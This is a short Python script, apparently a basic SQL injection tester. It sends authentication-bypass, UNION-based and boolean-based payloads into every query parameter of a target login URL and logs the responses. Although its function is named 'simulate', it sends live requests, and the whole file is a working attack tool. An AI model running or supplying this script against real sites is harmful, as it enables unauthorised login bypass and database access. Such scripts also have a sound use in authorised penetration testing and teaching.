import requests

def simulate_sql_injection(url, params, payloads):
    """
    Simulates SQL injection attacks against a web application.

    Args:
        url (str): The target URL of the web application.
        params (dict): A dictionary of query parameters to test.
        payloads (list): A list of SQL injection payloads to test.

    Returns:
        dict: A dictionary of payloads and their corresponding responses.
    """
    results = {}

    for payload in payloads:
        print(f"Testing payload: {payload}")

        # Inject payloads into each parameter
        for param in params:
            test_params = params.copy()
            test_params[param] = payload

            try:
                response = requests.get(url, params=test_params)
                results[payload] = {
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'content_preview': response.text[:200]
                }

            except Exception as e:
                results[payload] = {
                    'error': str(e)
                }

    return results

# Example usage
if __name__ == "__main__":
    target_url = "http://example.com/login"
    query_params = {
        "username": "test_user",
        "password": "test_pass"
    }

    sql_payloads = [
        "' OR '1'='1",  # Basic authentication bypass
        "' UNION SELECT null, null -- ",  # Union-based attack
        "' AND 1=1 -- ",  # Boolean-based SQL injection
        "' AND 1=2 -- ",
        "' OR 'x'='x"  # Another authentication bypass
    ]

    results = simulate_sql_injection(target_url, query_params, sql_payloads)

    for payload, result in results.items():
        print(f"Payload: {payload}")
        print(f"Result: {result}\n")
